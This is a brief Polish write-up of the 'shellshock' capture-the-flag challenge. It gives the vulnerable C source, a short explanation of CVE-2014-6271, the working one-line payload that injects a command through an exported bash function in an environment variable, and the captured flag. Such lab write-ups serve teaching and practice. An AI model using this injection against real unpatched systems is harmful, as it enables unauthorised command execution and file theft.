## shellshock - 1 pt ##

Flaga: `only if I knew CVE-2014-6271 ten years ago..!!`

Kod źródłowy **shellshock.c**:

```c
#include <stdio.h>
int main(){
	setresuid(getegid(), getegid(), getegid());
	setresgid(getegid(), getegid(), getegid());
	system("/home/shellshock/bash -c 'echo shock_me'");
	return 0;
}
```
* Bardzo proste zadanie polegające na exploitacji CVE-2014-6271 znanego jako Shellshock
* W dużym uproszczeniu: bash do 2014 roku pozwalał wykonywać polecenia zaszyte w zmiennych środowiskowych, a konkretniej w exportowanych funkcjach
* Do uzyskania flagi wystarczy stworzyć zmienną środowiskową ze ścieżką do binarki `cat` i flagi: `env x='() { :;}; /bin/cat flag' ./shellshock`:
```
shellshock@ubuntu:~$ env x='() { :;}; /bin/cat flag' ./shellshock
only if I knew CVE-2014-6271 ten years ago..!!
Segmentation fault
```
